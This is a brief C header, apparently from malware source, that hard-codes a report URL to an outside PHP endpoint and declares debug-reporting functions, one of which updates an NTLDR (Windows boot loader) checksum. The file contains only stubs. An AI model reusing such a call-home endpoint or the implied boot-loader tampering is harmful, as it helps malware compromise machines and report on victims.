#ifndef UUID_E4500F5134534F79A3663021D13CDBC8
#define UUID_E4500F5134534F79A3663021D13CDBC8

#define PP_REPORT_URL "http://kthjq.org/geter/indexa.php?"

#ifdef DBGRPT_ENABLED
#	define PP_DBGRPT_FUNCTION_CALL(function) { (function); } ;
#else 
#	define PP_DBGRPT_FUNCTION_CALL(function) __noop
#endif

void DebugReportStepByName(const char* StepName);
void DebugReportUpdateNtldrCheckSum();


#endif // #ifndef UUID_E4500F5134534F79A3663021D13CDBC8